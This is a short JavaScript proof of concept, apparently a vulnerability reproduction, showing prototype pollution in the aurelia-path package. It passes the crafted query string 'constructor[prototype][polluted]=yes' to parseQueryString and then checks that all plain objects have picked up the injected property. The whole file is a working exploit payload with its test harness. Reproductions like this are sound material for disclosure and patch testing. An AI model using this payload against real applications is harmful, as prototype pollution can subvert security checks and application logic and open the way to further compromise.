var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const ap = require('aurelia-path');
console.log({}.polluted);
ap.parseQueryString('constructor[prototype][polluted]=yes');
console.log({}.polluted);